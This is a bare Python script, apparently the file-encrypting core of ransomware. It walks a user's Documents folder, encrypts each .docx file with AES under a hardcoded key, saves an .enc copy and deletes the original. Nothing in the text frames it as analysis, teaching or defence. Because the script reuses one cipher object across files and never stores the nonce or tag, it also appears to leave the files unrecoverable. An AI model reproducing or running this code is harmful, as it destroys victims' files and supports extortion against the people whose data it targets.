from Crypto.Cipher import AES
import os

key = b'ThisIsASecretKey'
cipher = AES.new(key, AES.MODE_EAX)

for root, dirs, files in os.walk("C:/Users/Target/Documents"):
    for file in files:
        if file.endswith(".docx"):
            filepath = os.path.join(root, file)
            with open(filepath, "rb") as f:
                data = f.read()
            ciphertext, tag = cipher.encrypt_and_digest(data)
            with open(filepath + ".enc", "wb") as f:
                f.write(ciphertext)
            os.remove(filepath)
